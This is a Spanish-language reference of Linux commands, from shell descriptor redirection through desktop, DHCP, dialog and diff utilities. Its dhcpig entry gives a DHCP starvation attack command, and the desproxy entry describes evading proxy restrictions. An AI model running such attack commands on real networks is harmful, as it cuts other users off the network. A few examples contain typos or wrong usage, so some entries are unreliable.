$ exec 3>&1 > /tmp/salida.txt (que el descriptor 3 conecte su salida a donde la conecta el descriptor 1 [la pantalla] y después que este último se conecte al archivo /tmp/salida.txt. La consecuencia es que a partir de este momento todas las órdenes usarán como salida estándar el archivo)
$ exec 1>&3 3>&- (restituye la situación inicial, que el descriptor 1 conecte su salida a la del descriptor 3, o sea, la pantalla y, después, cierra el conector 3. Por tanto, a partir de ese momento, las órdenes volverán a mostrar su salida estándar por pantalla)
$ command > file 2>&1 (redirige la salida estándar y la salida estándar de error de command al archivo file)
$ exec 1>/dev/null (mandamos a /dev/null la salida estándar de cualquier comando que ejecutemos a continuación en la misma shell)
1.-
        $ exec 3<>/tmp/archivo.txt (cualquier cosa que se envíe a este descriptor, acabará en el archivo)
Los siguientes comandos no mostraran salida en el terrminal
        $ echo "Hola" >&3
        $ tty >&3
        $ cat /tmp/archivo.txt
        Hola
        /dev/pts/1
Cerrar el descriptor y volver a la normalidad
        $ exec 3>&-
2.-
Lo mismo
        $ exec 3>&1
        $ exec 1> >(while read line; do echo "$(date): $line"; done > /tmp/log.txt)
Los siguientes comandos no mostraran salida en el terrminal
        $ echo "Linux es un sistema genial"
        $ who
        $ tty
Cerrar el descriptor
        $ exec 1>&3 3>&-
Muestra las 3 últimas salidas de los comandos
        $ nano /tmp/log.txt
3.-
Tunel SSH con descriptors
        $ exec 3<>/dev/tcp/google.com/80
        $ echo -e "GET / HTTP/1.1\nHost: google.com\nConnection: close\n\n" >&3
        $ cat <&3
Mostrará salida. Volver a la normalidad:
        $ exec 3>&-
4.-
Adivinar el número mayor, menos o correcto con pipes
# Terminal 1: Servidor
        $ mkfifo /tmp/guess_pipe
        $ exec 3<>/tmp/guess_pipe
        $ number=$((RANDOM % 100 + 1))
        $ while read guess <&3; do
            [ "$guess" -eq "$number" ] && echo "¡Correcto!" && break
            [ "$guess" -lt "$number" ] && echo "Mayor" || echo "Menor"
          done
Quedará a la espera de los números que se entren en la terminal 2
# Terminal 2: Cliente
        $ exec 4>/tmp/guess_pipe
        $ echo "50" >&4
        $ echo "150" >&4


desktop-file-utils
Incluye los siguientes ejecutables: desktop-file-edit, desktop-file-install [instala un archivo de escritorio y lo ejecuta en el camino.], desktop-file-validate [ver] [valida un archivo de escritorio] y update-desktop-database [actualiza la asignación desktop-MIME]


desktop-file-validate
Herramienta para validar archivos de entrada de escritorio de acuerdo con la especificación Desktop Entry 1.0. La especificación describe un formato de archivo para proporcionar información como el nombre, el icono y la descripción de una aplicación.
$ desktop-file-validate --no-hints file.desktop(No proporcionar sugerencias sobre cosas que podrían mejorarse en el archivo de escritorio)
$ desktop-file-validate --no-warn-deprecated file.desktop (No adviertir sobre el uso de elementos obsoletos)
$ desktop-file-validate --warn-kde file.desktop (Advierte si se utilizan extensiones de KDE para la especificación)


desproxy
Permite realizar conexiones TCP/IP a través de proxies que solo ofrecen servicio http [puerto 80], de forma que, aunque el proxy este configurado para permitir únicamente la navegación web, podremos usarlo para acceder a otros servicios.


detachtty
Permite ejecutar programas interactivos de forma no interactiva y conectarse a través de la red cuando se necesita interactuar con ellos. Permite conectarse a programas que se ejecutan en hosts remotos mediante conexiones SSH seguras como si se tratara de una "pantalla virtual".
$ detachtty /tmp/vim_session vim (lanza vim de forma no interactiva, y su sesión se almacena en el archivo /tmp/vim_session)
$ detachtty /tmp/vim_session (para reconectarte más tarde)
$ ssh usuario@servidor "detachtty /tmp/remote_session top" (ejecuta top en el servidor remoto y almacena la sesión en /tmp/remote_session)
$ ssh usuario@servidor "detachtty /tmp/remote_session" (reconectarse más tarde)
$ detachtty -d /tmp/sesion_fondo bash (iniciar un programa en segundo plano sin conexión interactiva inicial)


detex
Pasar un archivo latex a txt.
$ detex -n archivo.tex > archivo.txt


detox
Se utiliza para limpiar y renombrar archivos eliminando o reemplazando caracteres problemáticos en los nombres de archivos. Esto es especialmente útil cuando se trabaja con archivos que pueden tener espacios, caracteres especiales o que no son compatibles con ciertos sistemas o aplicaciones. No sobrescribirá un archivo que ya existe y no toca archivos especiales si no se lo solicitan.
Supongamos un directorio con el siguiente contenido:
$ nano pruebas
       Archivo con espacios.txt
       Archivo@con#caracteres!raros.txt
       Ejemplo (1).txt
$ detox pruebas/* (renombra todos esos archivos a una forma más manejable)
       Archivo_con_espacios.txt
       Archivo_con_caracteres_raros.txt
       Ejemplo_1.txt
$ detox -n * (mostrará cómo se renombrarían los archivos sin realmente renombrarlos)
$ detox -p "mp3_" * (agregar un prefijo a los nombres de archivo)
$ detos -s "_rock" * (agregar un sufijo a los nombres de archivo)
$ detox -r * (también procesesar los archivos de subdirectorios)


deurlname
[renameutils]. Elimina los caracteres codificados en la URL (como %20 que representa el espacio) de los nombres de los archivos. Algunos programas, por ejemplo w3m, tienden a mantener esos caracteres codificados en los archivos guardados. Útil para guardar archivos que se han descargado de Internet limpiando su URL.
$ deurlname omg%20ponnu%20ily%20kannu.mp3


dev
El linux todo son archivos y, por supuesto, los dispositivos tambien y se encuentran bajo el directorio /dev. Relación de dispositivos comunes:
        /dev/null       c       1:3     Agujero negro, descarta todo lo que escribes.
        /dev/zero       c       1:5     Genera infinitos ceros.
        /dev/random     c       1:8     Aleatorios de alta entropía. Puede bloquear.
        /dev/urandom    c       1:9     Aleatorios no bloqueantes.
        /dev/tty        c       5:0     Terminal actual.
        /dev/tty0       c       4:0     Consola del sistema, VT actual.
        /dev/tty1       c       4:1     Primera consola virtual.
        /dev/console    c       5:1     Consola del sistema usada al inicio.
        /dev/full       c       1:7     Siempre devuelve “sin espacio en el dispositivo”.
        /dev/loop0      b       7:0     Primer dispositivo loopback. Montar archivos como discos.
        /dev/sda        b       8:0     Primer disco duro SATA/SCSI.
        /dev/sda1       b       8:1     Primera partición del primer disco.
        /dev/nvme0n1    b       259:0   Primer disco NVMe.
        /dev/nvme0n1p1  b       259:1   Primera partición del NVMe.
Mayor = identifica al controlador [driver].
Menor = identifica al dispositivo dentro de ese driver.
c = carácter
b = bloque.
$ cat /proc/devices (consultar todos los números de los drivers)
$ ls -l /dev | less (ver los dispositivos creados en el sistema)


devilspie2
Herramienta para gestionar ventanas en el entorno gráfico de forma automática. Utiliza scripts en lenguaje Lua en el directorio ~/.config/devilspie2/ para describir las acciones que deben realizarse cuando se detectan ventanas específicas a medida que se crean, como cambiar el tamaño, moverlas a otro espacio de trabajo o fijarlas.
$ devilspie2 & (iniciar en segundo plano)
las reglas se escriben en un archivo .lua dentro del directorio de configuración, por ejemplo supongamos que se quiere que "Firefox" se abra en el espacio de trabajo 2:
$ nano ~/.config/devilspie2/firefox.lua (crear el archivo)
Con el siguiente contenido:
       if (get_window_name() == "Mozilla Firefox") then
           set_workspace(2)
       end
Para mover una ventana llamada "Terminal" a la esquina superior izquierda y cambiar su tamaño a 800x600 píxeles:
$ nano ~/.config/devilspie2/terminal.lua (crear el archivo)
       if (get_window_name() == "Terminal") then
           set_window_geometry(0, 0, 800, 600)
       end
Para que la ventana llamada "Music Player" esté disponible en todos los espacios de trabajo:
       if (get_window_name() == "Music Player") then
           pin_window()
       end
Para aplicar reglas a todas las ventanas de "Gedit"
       if (get_application_name() == "gedit") then
           set_workspace(3)
           maximize()
       end
$ devilspie2 --debug (ejecutar en modo de prueba para verificar que las reglas funcionan correctamente)
Para que devilpie2 inicie al arrancar el pc, por ejemplo en LXDE:
# nano /etc/xdg/lxsession/LXDE/autostart
Y añadir la linea
@devilpie2


devio
Leer o escribir correctamente una región de un dispositivo de bloques como discos duros, SSDs. Es un programa para leer correctamente desde dispositivos de bloques y otros de caracteres MTD [Memory Technology Devices] como memorias flash. Esto puede ser útil en varias situaciones, como la recuperación de datos, la manipulación directa de dispositivos de almacenamiento, o el análisis de dispositivos de memoria flash.
$ devio -r /dev/mtd0 0 512 (leer los primeros 512 bytes del dispositivo /dev/mtd0)
$ devio -w /dev/mtd0 0 512 < archivo_de_datos (escribir 512 bytes de datos de la posición 0 en adelante en /dev/mtd0 y el archivo que contiene los datos que se escribiran)
$ devio -r /dev/sda 1000 512 (leerá 512 bytes del sector 1000 de /dev/sda)


devscripts
Scripts para simplificar la vida del mantenedor de paquetes Debian. Incluye la herramientas annotate-output, archpath, bts, build-rdeps, chdist, checkbashisms, cowpoke, cvs-debi, cvs-debc, cvs-debrelease,  cvs-debuild, dcmd, dd-list, debbisect, debc, debchange [abbreviation dch], debcheckout, debclean, debcommit, debdiff, debdiff-apply, debi, debootsnap, debpkg, debrelease, debrebuild, debrepro, debrsign, debsign, debsnap, debuild, deb-janitor, deb-reversion, deb-why-removed, dep3changelog, desktop2menu, dget, diff2patches, dpkg-depcheck, dpkg-genbuilddeps, dscextract, dscverify, edit-patch, getbuildlog, git-deborig, grep-excuses, hardening-check, list-unreleased, ltnu [Long Time No Upload], manpage-alert, mass-bug, mergechanges, mk-build-deps, mk-origtargz, namecheck, nmudiff, origtargz, plotchangelog, pts-subscribe, rc-alert, reproducible-check, rmadison, sadt, salsa, suspicious-source, svnpath, tagpending, transition-check, uscan, uupdate, what-patch, whodepends, who-permits-upload, who-uploads, wnpp-alert, wnpp-check y wrap-and-sort. Una explicación para cada uno en https://github.com/Debian/devscripts.


devtodo
Herramienta que permite gestionar tareas de manera jerárquica, lo que significa que se puede crear tareas principales y subtareas. También permite organizar las tareas por prioridad y ofrece una interfaz colorida en la terminal para facilitar la visualización. Además, tiene funciones que permiten exportar la lista de tareas en diferentes formatos de texto. Viene con hojas de estilo XSLT para convertir archivos XML y .todo a HTML y PDF.
$ devtodo add "Comprar leche" (crear una nueva tarea)
$ devtodo add "Hacer la compra" --parent "Comprar leche" (agregar una subtarea)
$ devtodo list (listar tareas)
$ devtodo done "Comprar leche" (marcar una tarea como completada)
$ devtodo remove "Hacer la compra" (eliminar una tarea)
$ devtodo edit "Comprar leche" "Comprar leche y pan" (cambiar el nombre de una tarea)
$ devtodo export markdown > tareas.md (exportar la lista de tareas)
Un ejemplo práctico podría ser:
$ devtodo add "Proyecto casa"
Agregar subtareas
$ devtodo add "Comprar materiales" --parent "Proyecto casa"
$ devtodo add "Contratar a un electricista" --parent "Proyecto casa"
$ devtodo add "Planificar el diseño" --parent "Proyecto casa"
$ devtodo list
      Proyecto casa
        - Comprar materiales
        - Contratar a un electricista
        - Planificar el diseño


dex
[DesktopEntry eXecution]. Herramienta que se utiliza para gestionar el inicio automático de aplicaciones mediante archivos .desktop. Estos archivos son parte de la especificación de Freedesktop.org y son ampliamente utilizados en entornos de escritorio como GNOME, KDE, XFCE y otros.
$ dex -ad (verificar qué aplicaciones serían iniciadas sin ejecutarlas realmente)
$ dex -a (iniciar automáticamente todas las aplicaciones definidas en los directorios estándar ~/.config/autostart/ y /etc/xdg/autostart/)
$ dex -a -e GNOME (indicar un entorno específico)
$ dex -r /path/to/directory (ejecutar recursivamente todos los archivos .desktop en un directorio y subdirectorios)
$ dex -c /usr/bin/skype (Crear una DesktopEntry para un programa en el directorio actual)
$ dex ~/scripts/myapp.desktop (iniciar un archivo .desktop en una ubicación específica)
Nota.- Si se crean archivos .desktop es preferible colocarlos en los directorios estándar mencionados más arriba.
1.-
Para un administrador de ventanas como Openbox o similar, incluir dex en el archivo de configuración para iniciar las aplicaciones automáticamente:
$ nano ~/.config/openbox/autostart
Y poner la linea:
        dex --autostart &
2.-
Un archivo .desktop típico podría lucir así:
$ nano ~/.config/autostart/telegram.desktop
       [Desktop Entry]
       Type=Application
       Name=telegram-desktop
       Exec=/usr/bin/telegram-desktop
       Icon=/usr/share/icons/hicolor/16x16/apps/telegram.png
       Comment=Qué se cuenta la gente
       X-GNOME-Autostart-enabled=true
La aplicación telegram sera iniciada con
$ dex -a


df
Mostrar información de las particiones
$ df -h (los resultados en M y G, por defecto son en bytes)
$ df -a (de todas las particiones incluso las de 0 bloques)
$ df -t vfat (de las particiones especificadas, en el caso las vfat)
$ df -T (de todas las particiones y el tipo)


dfc
Muestra el uso del sistema de archivos mediante gráficos y colores. En cierto modo, es una versión modernizada de df, ya que puede utilizar colores, dibujar gráficos y exportar su salida a diferentes formatos, como CSV o HTML.
# dfc -a (mostrar todo)
$ dfc -c never (sin color)
$ dfc -e html > archivo.html (exportar el resultado a html)
# dfc -i (información sobre los inodos)
$ dfc -l -m (mostrar solo los archivos montados y usando potencias de 10 en logar de potencias de 2)
$ dfc -p /dev (solo ver los dispositivos montados)
$ dfc -t ext (filtrar por tipo de sistema de archivos)
$ dfc -T (mostrar el tipo de sistema de archivos)


dfrs
Muestra el uso del espacio del sistema de archivos mediante gráficos y colores. dfrs muestra la cantidad de espacio en disco disponible en el sistema de archivos que contiene cada argumento de nombre de archivo. Si no se proporciona ningún nombre de archivo, se muestra el espacio disponible en todos los sistemas de archivos montados actualmente. dfrs(1) es una herramienta similar a df(1) excepto que puede mostrar un gráfico junto con los datos y puede usar colores. Sin ningún argumento, el tamaño se muestra en formato legible para humanos.
$ dfrs (muestra el uso de los sistemas montados)
$ dfrs -a (mostrar más sistemas de archivos que los anteriores. Con -aa los muestra todos incluso los no montados)


dfu-util
es un programa que implementa el protocolo USB DFU 1.0 y 1.1 [Universal Serial Bus  Device Firmware Upgrade] diseñado para descargar y cargar firmware a dispositivos compatibles conectados por USB ya sea pequeños como placas de microcontroladores, placas de desarrollo, algunos teléfonos móviles, etc.
$ dfu-util -l (listar dispositivos DFU conectados)
$ dfu-util -a 0 -d 0483:df11 -D firmware.bin (descargar y cargar firmware al dispositivo)
        -a 0 --> altsetting 0, la mayoría de las veces es 0.
        -d 0483:df11 --> ID de dispositivo USB [vendor:product]. Se obtiene con dfu-util -l.
        -D firmware.bin --> archivo binario a cargar y descargar.
$ dfu-util -a 0 -U backup_firmware.bin (subir y leer firmware desde el dispositivo9
$ dfu-util -a 0 -s 0x08000000:leave -D firmware.bin (especificar dirección de memoria)
        -s 0x08000000 --> dirección de inicio de la memoria Flash.
        :leave --> le indica al bootloader que salga del modo DFU después de cargar el firmware.


dglob
Expandir nombres o archivos de paquetes que coincidan con un patron.
$ dglob -a goodies (Buscar en todos los paquetes disponibles no solo en los instalados)
$ dglob -n goodies (Buscar en todos los paquetes disponibles sin incluir los instalados)


dgrep
Busqueda a través de archivos que pertenecen a un paquete Debian instalado.
$ dgrep goodies debian-goodies
$ dgrep dpigs debian-goodies


dhclient
Cliente DHCP
# dhclient eth0  (modifica la ip de la máquina)
# dhclient -v -r eth0 (Limpiar la ip actual)
# dhclient -v eth0 (solicitar ip)


dhcp-helper
Escucha las transmisiones DHCP [Dynamic Host Configuration Protocol] y BOOTP [Bootstrap Protocol] en subredes conectadas directamente y las retransmite a servidores DHCP o BOOTP en otros lugares, permitiendo la asignación de direcciones IP incluso si el servidor DHCP no está en la misma subred.
$ dhcp-helper -b -s 192.168.1.100 -i eth0 (-b que se ejecute en segundo plano, -s 192.168.1.100 es el servidor DHCP al que se retransmiten las solicitudes y -i eth0 la iInterfaz en la que escucha las solicitudes DHCP)
$ dhcp-helper -b -s 192.168.1.100 -s 192.168.1.101 -i eth0 (reenviar solicitudes DHCP a múltiples servidores)
$ dhcp-helper -b -s 192.168.1.100 -i eth0 -i wlan0 (se retransmiten solicitudes desde ambas interfaces)
$ $ dhcp-helper -d -s 192.168.1.100 -i eth0 (modo de depuración y muestra información en la terminal)
$ dhcp-helper -b -s 192.168.1.100 (retransmitir todas las solicitudes de DHCP de todas las interfaces del sistema)
1.-
Para iniciar automáticamente dhcp-helper al inicio:
# nano /etc/default/dhcp-helper
       INTERFACES="eth0"
       SERVERS="192.168.1.100"
       OPTIONS="-b"
Después, activar el servicio:
# systemctl enable dhcp-helper
# systemctl start dhcp-helper


dhcp-probe
Herramienta que se utiliza para detectar servidores DHCP [Dynamic Host Configuration Protocol] y BootP [Bootstrap Protocol] en una red Ethernet. Su función principal es enviar paquetes la red y escuchar las respuestas de los servidores DHCP y BootP, lo que permite identificar qué servidores están disponibles y qué información ofrecen.
# dhcp_probe eth0 (encontrar servidores DHCP en la interfaz eth0)


dhcpcd
Configuración automática de la red dhcp
$ dhcpcd eth0


dhcpig
Envía solicitudes DHCP de manera continua para ocupar todas las direcciones IP disponibles. Además, puede liberar las direcciones IP que ya están en uso, lo que puede causar problemas a los dispositivos que están conectados a la red.
# dhcpig -i eth0 (realizar un ataque a la red eth0)
# dhcpig -i eth0 --release (liberar direcciones IP ya en uso en la red eth0)


dhcping
Enviar una solicitud DHCP a un servidor DHCP para ver si está activo.
# dhcping -t 5 -s https://cloud.google.com/solutions/web-hosting (tiempo de espera 5 segundos, por defecto 3 y enviar un paquete al servidor especificado)
# dhcping -v -h 00:23:54:57:FC:78 -s 192.168.1.10 -c 192.168.1.15 (Mostrando la máxima información [v], la MAC del servidor DHCP [h] y su ip [s] y nuestra máquina [c])


dhelp
Leer toda la documentación de ayuda de debian con el navegador.
$ firefox file:///usr/share/doc/HTML/index.html


dhex
Editor hexadecimal interactivo que permite ver y modificar archivos binarios y que incluye un modo diff, que se puede utilizar para comparar dos archivos binarios.
$ dhex archivo.bin (visualizar y editar un archivo en hexadecimal)
$ dhex archivo1.bin archivo2.bin (comparar dos archivos binarios y ver sus diferencias)
En modo interactivo las teclas para moverse son:
       Flechas del teclado --> Para moverte por los bytes.
       TAB --> Alternar entre la vista hexadecimal y la vista ASCII.
       Enter --> Editar el byte seleccionado.
       CTRL + x --> Guardar cambios y salir.
       CTRL + c --> Salir sin guardar.


dhis-client
Cliente de un sistema de información de host dinámico. dhid es el demonio cliente de DHIS [Dynamic Host Configuration Interface Service - servicio de DNS dinámico]. Esto es útil en situaciones donde un dispositivo, como un servidor o una computadora, no tiene una dirección IP estática y, por lo tanto, su dirección IP puede cambiar cada vez que se conecta a Internet. Un cliente de DNS dinámico permite que el dispositivo actualice automáticamente su dirección IP en un servidor DNS, de modo que siempre pueda ser accesible mediante un nombre de dominio fijo. Primero, se necesita configurar el cliente con la información del proveedor de DDNS [Dynamic Domain Name Service]. Esto incluye detalles como el nombre de usuario, la contraseña, el nombre de dominio que se desea actualizar, etc. Una vez configurado, se puede ejecutar un demonio [dhid] que se ejecuta en segundo plano. Este demonio monitoriza los cambios en la dirección IP del dispositivo y, si detecta un cambio, se comunica con el servidor DDNS para actualizar la dirección IP asociada con el nombre de dominio.
Configurar un servidor con el nombre de dominio, por ejemplo, mi-servidor.dyndns.org:
# nano /etc/dhis-client.conf
      service=dyndns
      username=tu_usuario
      password=tu_contraseña
      hostname=mi-servidor.dyndns.org
# dhid (arrancar el demonio)
# # systemctl status dhis-client (verificar estado que ver que esté activo)


dhomepage
[debian-goodies]. Abre, si existe, en el navegador la página de información de un paquete debian.
$ dhomepage debian-history


di
Muestra información sobre las particiones como df [ver] mejorado.
$ di
$ di -q (Salida en gigabytes)
$ di -f a /dev/nvme0n1p6 (mostrar el porcentaje libre de una partición)


di-netboot-assistant
Asistente de arranque en red del instalador Debian. di-netboot-assistant es una herramienta que simplifica la preparación de archivos para el arranque en red TFTP. Se encarga de descargar, extraer y organizar los archivos necesarios para iniciar una instalación de Debian desde la red. di-netboot-assistant solo descarga y organiza los archivos, pero se necesita un servidor TFTP para usarlos.
# di-netboot-assistant install bookworm (descargará y configurará automáticamente los archivos en el directorio /var/lib/tftpboot/debian-installer para instalar la imagen de arranque en red para Debian 12)
# di-netboot-assistant list (ver distribuciones posibles: stable, testing, unstable, o nombres específicos como bookworm, trixie, etc)
# di-netboot-assistant remove bookworm (eliminará los archivos relacionados con esa versión del instalador de Debian)
# di-netboot-assistant update (verificará si hay versiones más recientes de las imágenes instaladas y las actualizará)


dialog
Muestra cuadros de diálogo para scripts
$ dialog --calendar "mes de junio" 0 0 1 6 2010  ("0 0" indica que se autodimensiona el cuadro. El tamaño estándar de una terminal es un ancho de 80 por un largo de 25. "1 6 2010" fecha con formato dia/mes/año)
$ dialog --checklist "Escoger servicios" 0 0 3 vnc "" "" ssh "" "" cups "" "" ("3" numero de entradas visibles, si hay más se usará el scroll. Las "" indican parámetros vacios que puedan sustituirse por palabras o números, el primero de los cuales aparecerá en el cuadro de diálogo [vnc 1 A ssh 2 B cups 3 C])
$ dialog --dselect /home/usuario/ 0 0  (mostrará el contenido del directorio mencionado)
$ dialog --editbox /etc/fstab 0 0   (mostrará el contenido del fichero seleccionado)
$ dialog --fselect /home/usuario/ 0 0  (Mostrará dos ventanas una con los directorios y la otra con los ficheros)
$ dialog --gauge "Uso del software libre" 0 0 0  (Muestra el progreso de un proceso)
$ for var in 0 10 20 30 40 50 60 70 80 90 100; do sleep 1; echo $var; done | dialog --gauge "Total completado" 6 60 0 (concatenación de dialogs)
$ dialog --infobox "Esto va a explotar...." 3 26  (Un cuadro con un texto)
$ dialog --sleep 3 --infobox "Esto va a explotar...." 3 26 (Vuelve al prompt a los 3 segundos)
$ dialog --sleep 3 --title "AVISO" --infobox "Esto va a explotar en 3 segundos...." 3 40; dialog --infobox "BOOOOOOOMMMM" 0 0 (Concatenación de dialogs)
$ dialog --inputbox "Ingrese su nombre" 0 0 (Solicitar una linea de texto al usuario)
$ dialog --passwordbox "Ingrese contraseña" 0 0 (Igual que inputbox pero no se muestra nada de lo que se ingresa en pantalla)
$ dialog --title "Aquí me las den" --no-cancel --inputbox "Dejame un mensaje cariño" 0 0 ""  (Especificando un título, sin el botón de "cancelar" y con cajón para dejar un mensaje)
$ dialog --inputmenu "Nombre del usuario" 0 0 3 " juan Perez" "c/ del Pulgar num 5" "Jose Gonzalez" "c/ pez num 11"  (Permite modificar el segundo concepto [La calle])
$ dialog --menu "Escoge una distro..." 0 0 3 1 "Arch" 2 "Red Had" 3 "Ubuntu" 4 "Debian"
$ dialog --mixedgauge "errores" 0 0 30 ubuntu distros
$ dialog --msgbox "\n Aquí puedes poner un texto" 0 0   (Avisar de una acción o comunicación y separando el texto de la parte superior [\n])
$ dialog --timeout 10 --clear --passwordbox "Entra la contraseña" 0 0 ""  (Especificando un tiempo para entrarla y limpiando la pantalla)
$ dialog --backtitle "Sobre timeout..." --timeout 5 --pause "Espera un rato..." 10 10 5   (Esperar 5 segundos antes de volver al prompt y con el título en la parte superior de la ventana [--backtitle])
$ dialog --radiolist "Escoger servicios" 0 0 3 vnc "" "" ssh "" "" cups "" ""  (parecido a checklist)
$ dialog --no-shadow --tailbox /etc/fstab 0 0   (Mostrar últimas lineas de un archivo sin sombreado de la ventana)
$ dialog --timebox "Tiempo de espera" 0 0 22 55 33
$ dialog --extra-button --timebox "Tiempo de espera" 0 0 22 55 33  (Incluir un boton extra)
$ dialog --defaultno --timebox "Tiempo de espera" 0 0 22 55 33  (Seleccionando por defecto "cancelar")
$ dialog --yesno "Quieres pasar a la siguiente opción?" 0 0 (Retornara un valor cero, si se selecciona YES o distinto de cero si se selecciona NO. Este valor se almacena en la variable $? y puede ser evaluado mediante un if, while,...)
$ dialog --tailbox /var/log/fail2ban.log 20 100 (muestra en tiempo real las incidencias en el fichero mencionado. Equivalente a tail -f)
Algunos ejemplos prácticos de su uso en scripts:
1.-
#!/bin/bash
dialog --menu "Opciones del script" 16 60 14 1 "Puertos abiertos" 2 "Intentos de acceso" 3 "las IPs externas e internas" 4 "Cantidad de intentos de ataques" 5 "Servicios activos" 6 "Salir"
clear
2.-
#!/bin/bash
# Escanear puertos abiertos
nmapResultat=$(sudo nmap -O localhost | grep "open" | awk '{print$1,$3}')
dialog --title "Resultado del escaneo de puertos" --msgbox "Los puertos abiertos son:
$nmapResultat" 0 0
clear
3.-
#!/bin/bash
# Parar un servicio
dialog --title "samba" --yesno "Quieres detener samba?" 0 0
case $? in
0)
sudo /etc/init.d/samba stop
dialog --title "Info" --msgbox "samba detenido" 0 0;;
1)
dialog --title "Info" --msgbox "samba continua activo" 0 0 ;;
255)
dialog --title "Info" --msgbox "ESC presionado... samba activo" 0 0 ;;
esac
clear
$ dialog --title "Mensaje al mundo" --msgbox "\n      Hola a todos" 6 35
$ dialog --yesno "¿Estás de acuerdo?" `tput lines` `tput cols`
$ dialog --menu "Escoger interfaz" 0 0 0 g "gnome" k "kde" x "xfce" 2>&1
4.-
#!/bin/bash
# Respuestas  como variables
TMPFILE="/tmp/scripttemp.$$"
dialog --inputbox "Ingrese su nombre" 10 30 2> $TMPFILE
N=`cat $TMPFILE`
dialog --inputbox "Ingrese su edad" 10 30 2> $TMPFILE
E=`cat $TMPFILE`
# Borrar tmpfile
rm -f $TMPFILE
dialog --infobox "$N tiene $E años" 3 50


diceware
Generador de frases de contraseña concatenando palabras seleccionadas al azar de un fichero con una lista de palabras que es opcional.
$ diceware
$ diceware -n 3 -c -s 4 -d ? (concatenando 3 palabras, con mayusculas, insertar 4 caracteres especiales y seprando las palabras con un ?)


dict
Diccionario en inglés.
$ dict linux


diction
Utilidades para mejorar el estilo y la dicción en inglés y alemán. Incluye la aplicación style.
$ echo "I am going to the store in order to buy some things that are necessary." | diction
$ diction -s -d -L en texto.txt (sugiere reescrituras mejores con "->", que ignore palabras duplicadas, en idioma inglés ["de" para alemán] y el archivo a procesar)
$ cat archivo.txt | diction -L en | fmt (analiza con base inglés y reformatea el texto)
$ echo "The the cat runs very very fast." | diction -b -L en (detectar duplicados y errores de principiante)
$ echo "The quick brown fox jumps over the lazy dog. This is a longer sentence with more complex words like photosynthesis." | style
$ echo "The decision was made by the committee. The ball was kicked." | style -n -L en (lista oraciones pasivas o con nominalizaciones)


dictzip
Utilidad para comprimir bases de datos de diccionarios [.dict] con el algoritmo LZ77, útil para reducir su tamaño y hacer que sean más eficientes de almacenar y transferir. Incluye dictunzip [descomprimir] y dictzcat [visualizar archivos comprimidos].
$ dictzip diccionario.dict (genera un archivo comprimido llamado diccionario.dict.dz)
$ dictzip -d diccionario.dict.dz (devuelve el archivo a su forma original)
$ dictzip -l diccionario.dict.dz (muestra detalles como el tamaño comprimido y descomprimido del archivo)
$ dictzip -c 9 diccionario.dict (aplica la compresión máxima al archivo)
$ dictzip -k diccionario.dict (comprimir un archivo y mantener el original sin cambios)
$ dictzip -c diccionario.dict > nuevo_diccionario.dict.dz (redirige el archivo comprimido a nuevo_diccionario.dict.dz en lugar de usar el nombre predeterminado)


didiwiki
wiki rápida y ligera para uso personal. Puede modificarse la apariencia en /etc/didiwiki/styles.css
$ didiwiki -l 127.0.0.1 -p 5000
En el navegador colocar la dirección http://localhost:5000 [por defecto el 8000] y lo que se navegue quedará reflejado, por defecto en /home/USER/.didiwiki.


dieharder
Interfaz de prueba de generador de números aleatorios para evaluar la calidad de generadores de números aleatorios. Aunque técnicamente no genera los números aleatorios por sí mismo, analiza los resultados de otros generadores de números aleatorios.
$ dieharder -f /ruta/al/archivo_secuencias_aleatorias.bin -g 216000 (analiza las secuencias aleatorias contenidas en el archivo especificado durante 6 horas [216000 segundos])
$ dieharder -f /ruta/al/archivo_secuencias_aleatorias.bin -t 3 (realiza pruebas estadísticas específicas sobre las secuencias aleatorias)
$ dieharder -f /ruta/al/archivo_secuencias_aleatorias.bin -d (muestra información detallada sobre el proceso de prueba, incluyendo estadísticas y resultados intermedios)
$ dieharder -f archivo1.bin -f archivo2.bin -g 360000 (analiza dos archivos diferentes de secuencias aleatorias durante 10 horas cada uno)
$ dieharder -f /ruta/al/archivo_secuencias_aleatorias.bin -s 1000 -e 20000 (limita el rango de pruebas entre 1000 y 20,000 pasos)


diff
Mostrar diferencias entre dos directorios o ficheros
$ diff archivo1 archivo2 (Compara diferencias entre dos ficheros)
$ diff -r carpeta1 carpeta2 (Compara diferencias de forma recursiva en los directorios)
$ diff -w fichero1 fichero2  (Descarta espacios en blanco)
$ diff -q fichero1 fichero2   (Informa si los ficheros difieren sin mostrar detalles)
$ diff -y fichero1 fichero2   (Muestra la salida a dos columnas)
$ diff –urp dir1 dir2 (Compara recursivamente el contenido de 2 directorios.)
$ diff -ru carpeta_original carpeta_modificada > parche.patch (Compara de forma recursiva dos directorios y genera un parche en un fichero .patch con formato unificado de diff)
$ diff -u <(grep -vE '^(#|$)' file1) <(grep -vE '^(#|$)' file2)  (Los compara ignorando comentarios y lineas en blanco)


diff-cover
Herramienta útil para analizar la cobertura de pruebas en los cambios recientes de un proyecto. Se utiliza principalmente para verificar qué líneas de código en un diff no están cubiertas por pruebas automatizadas, asegurando así que las modificaciones recientes estén bien testeadas antes de ser fusionadas en una rama principal.
$ git diff origin/main | diff-cover coverage.xml (comparará los cambios locales con la rama main y mostrará qué líneas modificadas no están cubiertas por pruebas)
$ git diff origin/main | diff-quality --violations=flake8 (mostrará solo los errores de estilo que están en líneas modificadas, ayudando a enfocar la corrección)
$ git diff origin/main | diff-cover coverage.xml --html-report diff_cover_report.html (generar un informe en HTML)


difference
Compara dos cadenas e imprime una representación visual colorida si difieren sin mostrar las diferencias.
$ difference archivo1 archivo2


diffimg
Genera una imagen donde cada píxel es la diferencia entre el píxel correspondiente en cada una de las dos imágenes de origen. Por lo tanto, si las imágenes de origen son las mismas, la imagen resultante será negra; de lo contrario, tendrá regiones no negras donde las imágenes difieren. Accepta .png, .gif y .jpg.
$ diffimg imagen1.png imagen2.png


diffmon
Monitorear archivos del sistema. El archivo donde especificar lo que se han de controlar es /etc/diffmon/diffmon.cf. Está diseñado para ejecutarse como un trabajo cron
$ diffmon


diffoscope
Comparar de forma recursiva archivos de muchos tipos [binarios, tarbals, imágenes ISO, pdfs...]. Las diferencias se pueden mostrar como texto o HTML. Los diversos comparadores dependen de comandos externos.
$ diffoscope --list-tools (lista los comandos expernos que se precisan)
$ diffoscope --html salida.html archivo1.txt archivo2.txt
$ diffoscope --text salida.txt archivo1.txt archivo2.txt


diffpdf
Compara dos archivos pdf.
$ diffpdf archivo1.pdf archivo2.pdf


diffstat
